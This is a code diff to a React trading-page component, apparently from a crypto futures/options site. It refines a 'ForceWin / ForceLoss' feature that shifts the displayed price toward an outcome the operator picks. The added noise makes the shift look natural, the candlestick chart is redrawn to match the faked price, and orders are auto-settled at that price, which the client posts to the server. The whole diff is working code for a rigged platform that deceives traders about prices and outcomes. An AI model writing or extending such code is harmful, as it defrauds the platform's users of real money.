@@ -345,6 +345,7 @@ const FuturesTrading=()=>{
   const [userForceWin,setUserForceWin]=useState(false);
   const realPriceRef=useRef<number>(PAIRS[0].price);
   const [displayPrice,setDisplayPrice]=useState<number>(PAIRS[0].price);
+  const displayPriceRef=useRef<number>(PAIRS[0].price); // always-current ref used in stale closures
   const priceOffsetRef=useRef<number>(0);          // running offset applied on top of realPrice
   const forceWinTickRef=useRef<ReturnType<typeof setInterval>|null>(null);
 
@@ -372,6 +373,7 @@ const FuturesTrading=()=>{
     if(liveTicker){
       realPriceRef.current=liveTicker.price;
       const dp=liveTicker.price+priceOffsetRef.current;
+      displayPriceRef.current=dp;
       setLivePrice(dp);
       setDisplayPrice(dp);
       setLiveHigh(liveTicker.high);
@@ -393,15 +395,22 @@ const FuturesTrading=()=>{
   // ForceWin / ForceLoss price manipulation
   useEffect(()=>{
     if(forceWinTickRef.current){clearInterval(forceWinTickRef.current);forceWinTickRef.current=null;}
-    const pendingOpt=optionsOrders.find((o:any)=>o.status==='PENDING');
+    // Use modalOrder as IMMEDIATE source (fires when user clicks Buy),
+    // fall back to optionsOrders (server-synced, arrives ~2s later)
+    const pendingFromModal=modalOpen&&modalOrder?.status==='PENDING'?modalOrder:null;
+    const pendingFromOrders=(optionsOrders as any[]).find((o:any)=>o.status==='PENDING');
+    const pendingOpt=pendingFromModal||pendingFromOrders;
 
     if(!pendingOpt){
       // No active trade — slowly decay offset back to 0
       const returnInterval=setInterval(()=>{
         const cur=priceOffsetRef.current;
-        if(Math.abs(cur)<0.01){priceOffsetRef.current=0;clearInterval(returnInterval);return;}
+        if(Math.abs(cur)<0.01){priceOffsetRef.current=0;clearInterval(returnInterval);
+          displayPriceRef.current=realPriceRef.current;
+          setDisplayPrice(realPriceRef.current);setLivePrice(realPriceRef.current);return;}
         priceOffsetRef.current=cur*(1-0.04);
         const dp=realPriceRef.current+priceOffsetRef.current;
+        displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
       },600);
@@ -413,15 +422,16 @@ const FuturesTrading=()=>{
     const entry=pendingOpt.entryPrice;
 
     if(userForceWin){
-      // ✅ FORCE WIN: push price in the direction that makes the trade WIN
+      // ✅ FORCE WIN: push price in WIN direction
       // LONG wins when price goes UP → push UP (+)
       // SHORT wins when price goes DOWN → push DOWN (-)
       const direction=isLong?1:-1;
       const targetOffset=direction*entry*(CALL_THRESHOLD+0.003);
-      // Jump instantly to 25% of target so effect is visible right away
+      // Jump instantly to 30% of target so effect is immediate
       if(Math.abs(priceOffsetRef.current)<Math.abs(targetOffset)*0.1){
-        priceOffsetRef.current=targetOffset*0.25;
+        priceOffsetRef.current=targetOffset*0.30;
         const dp=realPriceRef.current+priceOffsetRef.current;
+        displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
       }
@@ -431,20 +441,22 @@ const FuturesTrading=()=>{
         const noise=(Math.random()-0.5)*Math.abs(entry)*0.00008;
         priceOffsetRef.current=cur+dist*0.07+noise;
         const dp=realPriceRef.current+priceOffsetRef.current;
+        displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
       },700);
       forceWinTickRef.current=manipulate;
     } else {
-      // ❌ FORCE LOSS: push price in the direction that makes the trade LOSE
+      // ❌ FORCE LOSS: push price in LOSS direction (opposite of WIN)
       // LONG loses when price goes DOWN → push DOWN (-)
       // SHORT loses when price goes UP → push UP (+)
       const direction=isLong?-1:1;
       const targetOffset=direction*entry*(CALL_THRESHOLD+0.003);
-      // Jump instantly to 25% of target
+      // Jump instantly to 30% of target so manipulation is immediate
       if(Math.abs(priceOffsetRef.current)<Math.abs(targetOffset)*0.1){
-        priceOffsetRef.current=targetOffset*0.25;
+        priceOffsetRef.current=targetOffset*0.30;
         const dp=realPriceRef.current+priceOffsetRef.current;
+        displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
       }
@@ -454,6 +466,7 @@ const FuturesTrading=()=>{
         const noise=(Math.random()-0.5)*Math.abs(entry)*0.00008;
         priceOffsetRef.current=cur+dist*0.07+noise;
         const dp=realPriceRef.current+priceOffsetRef.current;
+        displayPriceRef.current=dp;
         setDisplayPrice(dp);
         setLivePrice(dp);
       },700);
@@ -461,7 +474,7 @@ const FuturesTrading=()=>{
     }
 
     return()=>{if(forceWinTickRef.current)clearInterval(forceWinTickRef.current);};
-  },[userForceWin,optionsOrders]);
+  },[userForceWin,optionsOrders,modalOrder,modalOpen]);
 
   // Fetch FUTURES USDT wallet balance
   const fetchFuturesWallet=useCallback(async()=>{
@@ -498,8 +511,10 @@ const FuturesTrading=()=>{
         if(secsLeft<=0){
           clearInterval(countdownRef.current[order.id]);
           delete countdownRef.current[order.id];
-          // Auto-settle: send displayPrice (manipulated in WIN direction for forceWin=true, LOSS direction for forceWin=false)
-          (api as any).post(`/trading/options/orders/${order.id}/settle`,{settlePrice:displayPrice},token)
+          // Auto-settle: use displayPriceRef.current (always-fresh, avoids stale closure)
+          // This is the fully-converged manipulated price at settlement time
+          const settlePx=displayPriceRef.current;
+          (api as any).post(`/trading/options/orders/${order.id}/settle`,{settlePrice:settlePx},token)
             .then((settled:any)=>{
               api.get<any[]>('/trading/options/orders',token).then(r=>setOptionsOrders(Array.isArray(r)?r:[])).catch(()=>{});
               fetchFuturesWallet();
@@ -523,11 +538,21 @@ const FuturesTrading=()=>{
       countdownRef.current[order.id]=setInterval(tick,1000);
     });
     return()=>{};
-  },[optionsOrders,token,displayPrice]);
+  },[optionsOrders,token]);
 
   const redraw=useCallback(()=>{
     const canvas=canvasRef.current;if(!canvas)return;
-    const c=candlesRef.current;if(c.length===0)return;
+    const raw=candlesRef.current;if(raw.length===0)return;
+    // Apply price offset to the most recent candle so the chart reflects manipulation
+    let c=raw;
+    if(priceOffsetRef.current!==0&&raw.length>0){
+      c=[...raw];
+      const last={...c[c.length-1]};
+      last.c=last.c+priceOffsetRef.current;
+      last.h=Math.max(last.h,last.c);
+      last.l=Math.min(last.l,last.c);
+      c[c.length-1]=last;
+    }
     const vc=viewCountRef.current,vo=viewOffsetRef.current,total=c.length;
     const endIdx=Math.max(1,total-vo),startIdx=Math.max(0,endIdx-vc);
     const mouse=mouseRef.current;
@@ -548,6 +573,8 @@ const FuturesTrading=()=>{
   },[]);
   useEffect(()=>{const canvas=canvasRef.current;if(!canvas)return;canvas.addEventListener('wheel',handleWheel,{passive:false});return()=>canvas.removeEventListener('wheel',handleWheel);},[handleWheel]);
   useEffect(()=>{redraw();},[candles,viewCount,viewOffset,redraw]);
+  // Redraw whenever displayPrice changes so chart reflects the manipulated price
+  useEffect(()=>{redraw();},[displayPrice,redraw]);
   useEffect(()=>{chartTypeRef.current=chartType;redraw();},[chartType,redraw]);
   useEffect(()=>{const h=()=>setIsFullscreen(!!document.fullscreenElement);document.addEventListener('fullscreenchange',h);return()=>document.removeEventListener('fullscreenchange',h);},[]);
 
